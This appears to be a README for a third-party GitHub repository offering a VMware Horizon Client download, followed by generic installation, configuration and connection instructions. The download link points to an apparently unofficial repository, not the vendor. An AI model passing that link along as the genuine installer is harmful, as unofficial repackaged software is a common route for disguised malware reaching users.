# VMware Horizon Client

Download latest version from Releases:       
https://github.com/vhlink/VMware-Horizon-Client/releases/tag/2412

### System Requirements and Setup

#### Hardware and Software Prerequisites

Before starting the installation, ensure your device meets these minimum specifications:

* **Processor**: x86-64 with SSE2 support (800 MHz or higher)
* **RAM**: Minimum 1 GB
* **Supported Operating Systems**:

  * Windows 11 (64-bit: Versions 22H2, 21H2)
  * Windows 10 (64-bit: Versions 22H2, 21H2, 20H2, LTSC 2021/2019)
  * Windows Server 2012 R2, 2016, 2019

### Authentication and Security Options

Horizon Client accommodates several authentication methods, including:

* **Smart Card Login**
* **Client Certificate Sign-In**
* **Two-Factor Authentication (RSA, RADIUS)**
* **Integration with Windows Hello for Business**

> \[!note]
> Certain methods may require additional configuration on the Horizon Server.

### Supported Operating Systems

The Windows edition of VMware Horizon Client is compatible with a broad range of desktop and server versions. Refer to VMware’s official documentation for comprehensive compatibility details.

## Installing and Updating Horizon Client

### Silent Installation Parameters

For automated installations, run:

```sh
VMware-Horizon-Client.exe /silent /install
```

To enable FIPS-compliant encryption:

```sh
VMware-Horizon-Client.exe VDM_FIPS_ENABLED=1
```

### Updating or Removing the Client

* To update, navigate to **Options > Software Updates** in the client.
* To uninstall, execute:

```sh
VMware-Horizon-Client.exe /uninstall
```

## Configuring Horizon Client

### Setting Up the Server Connection

Ensure the server-side configuration includes:

* **Correct IP address or DNS name**
* **Secure Tunnel enabled**, if necessary
* **Multi-Factor Authentication enabled**, when required

### Common Ways to Configure

Horizon Client settings can be adjusted via:

* **Group Policy Objects (GPOs)**
* **Windows Registry modifications**
* **Command-line options**

> \[!info]
> Advanced settings can be found under the registry path:
> `HKLM\Software\VMware, Inc.\Horizon Client`

## Connecting to Remote Desktops and Applications

### Sign-In and Authentication

1. Launch Horizon Client.
2. Enter the **Connection Server** address.
3. Provide your **Username and Password**.
4. Choose your **Target Desktop or Application** to initiate the session.

### Session Management and Reconnection

* Enable **Auto-Reconnect** to resume sessions without logging in manually.
* Use **Session Persistence** to maintain unsaved work during disconnects.

### Quick Access and Auto-Connect

* Create a **Desktop Shortcut** for faster access.
* Activate **Auto-Connect to Last Session** in preferences for convenience.

## Using Remote Desktops and Applications

### File and Clipboard Sharing

Enable **Clipboard Redirection** to copy text or data between your local and virtual environments. Drag-and-drop supports file transfers between desktops.

### Display and Input Adjustments

Adjust your session layout and interactions with:

```sh
vmware-view://desktopName?desktopLayout=fullscreen
```

### Performance Optimization Tips

* Opt for **VMware Blast** protocol for improved rendering and responsiveness.
* Close unused applications to free up system resources.

## Using External Devices

### Multi-Monitor Setup

* **Extend Displays** to span sessions across multiple monitors.
* **Assign Specific Monitors** for remote usage only.
